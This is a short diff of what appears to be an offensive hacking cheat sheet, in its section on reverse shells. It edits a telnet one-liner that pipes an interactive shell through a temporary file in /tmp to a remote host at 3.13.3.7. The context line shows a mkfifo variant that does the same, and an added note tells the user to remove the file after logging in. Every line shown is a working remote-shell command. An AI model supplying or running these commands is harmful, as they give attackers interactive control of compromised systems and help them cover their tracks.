@@ -1187,10 +1187,9 @@ mkfifo /tmp/.io; sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
 
 Telnet variant when mkfifo is not supported (Ulg!):
 ```sh
-({ touch /tmp/.fio; sleep 60; rm -f /tmp/.fio;} & );
-tail -f /tmp/.fio | sh -i 2>&1 | telnet 3.13.3.7 1524 >/tmp/.fio
+touch /tmp/.fio; tail -f /tmp/.fio | sh -i | telnet 3.13.3.7 31337 >/tmp/.fio
 ```
-Note: This trick logs your commands to a file. The file will be *unlinked* from the after 60 seconds but remains useable as a 'make shift pipe' as long as the reverse tunnel is started within 60 seconds.
+Note: Dont forget to `rm /tmp/.fio` after login.
 
 <a id="revese-shell-remote-moe"></a>
 **5.i.g. Reverse shell with remote.moe and ssh (encrypted)**
